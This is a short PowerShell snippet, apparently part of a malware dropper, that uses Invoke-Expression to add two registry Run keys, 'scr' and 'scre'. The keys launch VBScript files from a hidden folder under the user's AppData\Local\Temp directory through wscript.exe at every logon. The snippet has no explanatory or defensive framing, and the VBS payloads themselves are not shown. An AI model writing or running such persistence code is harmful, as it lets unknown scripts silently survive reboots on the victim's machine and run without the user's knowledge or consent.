$temp_dir = "OFWRV"

Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "scr" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\scr.vbs\""" /f'
Invoke-Expression 'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "scre" /t REG_SZ /d "wscript.exe \""C:\Users\$($env:Username)\AppData\Local\Temp\$temp_dir\scre.vbs\""" /f'
